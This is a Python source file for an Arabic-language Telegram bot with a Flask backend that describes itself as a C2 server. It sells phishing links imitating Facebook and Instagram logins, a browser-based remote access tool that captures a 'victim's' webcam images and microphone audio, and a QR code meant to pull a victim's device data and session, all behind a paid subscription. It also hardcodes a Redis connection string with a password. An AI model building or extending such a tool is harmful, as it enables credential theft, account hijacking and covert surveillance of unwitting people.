# main.py
import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import redis
import uuid

# ============================================================
# استيراد ملفات الأدوات
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

# ============================================================
# استيراد نظام الدفع (جديد)
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers,
        get_or_create_user,
        can_use_tool,
        consume_usage,
        build_plans_keyboard,
        build_main_payment_keyboard,
        build_account_text,
        build_plans_text,
        send_invoice,
        PRICING_PLANS,
        FREE_TRIAL_USES,
    )
    PAYMENT_ENABLED = True
except Exception as e:
    print(f"[-] Error importing stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 1


# ============================================================
# إعدادات عامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    redis_client.ping()
except Exception as e:
    print(f"[-] Critical Redis Connection Error: {e}")
    redis_client = None

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


# ============================================================
# Health check
# ============================================================
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200


# ============================================================
# تسجيل Blueprints ومسارات
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)

# تسجيل معالجات الدفع
register_payment_handlers(bot)


# ============================================================
# القوائم
# ============================================================
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    return markup


def payment_menu():
    return build_main_payment_keyboard()


# ============================================================
# رسائل مساعدة
# ============================================================
def _deny_message(reason, user_id, tool, data=None):
    """رسالة الرفض بناءً على السبب"""
    data = data or {}
    if reason == "daily_limit_reached":
        return (
            "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
            f"🎯 الحد اليومي: {data.get('daily_limit', 0)} عملية\n"
            "💎 قم بترقية باقتك أو انتظر لليوم التالي."
        )
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح لهذه الأداة.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني فقط عند التسجيل.\n"
            "💎 اشترك في إحدى الباقات للاستمرار.\n\n"
            "اضغط على 💎 الاشتراكات والدفع لعرض الباقات."
        )
    return "❌ لا يمكن استخدام الأداة حالياً."


# ============================================================
# Start Command
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    get_or_create_user(
        message.from_user.id,
        message.from_user.username or "Unknown",
        user_name
    )
    text = (
        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
        "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
        f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    # ---------- قائمة الدفع ----------
    if call.data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "💎 **قسم الاشتراكات والدفع**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "اختر ما تريد:",
            parse_mode="Markdown",
            reply_markup=build_main_payment_keyboard()
        )
        return

    if call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_plans_text(),
            parse_mode="Markdown",
            reply_markup=build_plans_keyboard()
        )
        return

    if call.data.startswith("buy_plan_"):
        plan_key = call.data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if call.data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if call.data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu())
        return

    # ---------- توليد فيسبوك ----------
    if call.data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ---------- توليد انستقرام ----------
    if call.data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ---------- توليد RAT ----------
    if call.data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(
            chat_id,
            f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
            "بمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.",
            parse_mode="Markdown"
        )
        return

    # ---------- توليد QR ----------
    if call.data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                print(f"Redis write error: {e}")

        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(
                chat_id,
                qr_image,
                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\n"
                        "بمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز "
                        "وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ---------- أوامر RAT اللاحقة (لا تستهلك رصيداً) ----------
    if call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
        return

    if call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
        return


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] Starting Telegram Bot polling in background thread...")
    try:
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"[-] Telegram Polling Error: {e}")


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
